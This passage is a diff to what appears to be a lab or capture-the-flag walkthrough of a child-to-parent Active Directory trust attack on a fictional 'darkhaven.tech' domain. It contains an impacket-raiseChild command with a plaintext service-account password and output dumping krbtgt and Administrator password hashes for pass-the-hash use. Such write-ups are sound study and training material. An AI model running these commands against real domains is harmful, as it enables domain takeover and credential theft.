@@ -691,7 +691,7 @@ https://www.thehacker.recipes/ad/movement/trusts/#golden-ticket
 
 Using this link i can see the different methods for performing a golden ticket attack
 
-First ill try just using `impacket-raiseChild`, this will only work if SID filtere
+First ill try just using `impacket-raiseChild`, this will only work if SID filtering is disabled
 
 ```python
 impacket-raiseChild "corp.darkhaven.tech"/"ldap_svc":'D@rkhav3nLDAP2024!'
@@ -710,4 +710,9 @@ darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:4b46aefa864315912f4ab7c27cb0d2865
 [*] Target User account name is Administrator
 darkhaven.tech/Administrator:500:aad3b435b51404eeaad3b435b51404ee:b38a41e844c5c3d706c1e9e575f3e62c:::
 darkhaven.tech/Administrator:aes256-cts-hmac-sha1-96s:3956c7969b120f4c636a8d0e97044fa574ee0ffbcb122903cf0e1ee325134ceb
+```
+Now i can use the hash to authenticate as the domain admin!
+
+```python
+
 ```
